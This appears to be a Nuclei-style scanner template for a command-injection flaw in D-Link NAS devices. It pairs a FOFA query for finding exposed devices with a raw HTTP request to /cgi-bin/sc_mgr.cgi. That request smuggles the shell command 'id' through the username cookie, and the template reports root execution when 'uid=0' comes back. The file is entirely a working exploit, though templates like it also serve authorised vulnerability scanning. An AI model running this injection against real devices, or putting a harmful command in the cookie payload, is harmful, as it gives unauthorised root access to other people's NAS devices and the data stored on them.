id: D-Link-NAS-sc-mgr-cgi

info:
  name: D-Link-NAS-sc-mgr-cgi
  author: lengmo
  severity: high
  description: D-Link-NAS-sc-mgr-cgi
  tags: 
  metadata:
    fofa-query: body="/cgi-bin/login_mgr.cgi"  &&  body="cmd=cgi_get_ssl_info"

http:
  - raw:
      - |
        GET /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
        Accept: */*
        Accept-Encoding: gzip, deflate
        Connection: close
        Cookie: username=mopfdfsewo'& id & echo 'mopfdfsewo;

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'uid=0'
        
      - type: status
        status: 
          - 200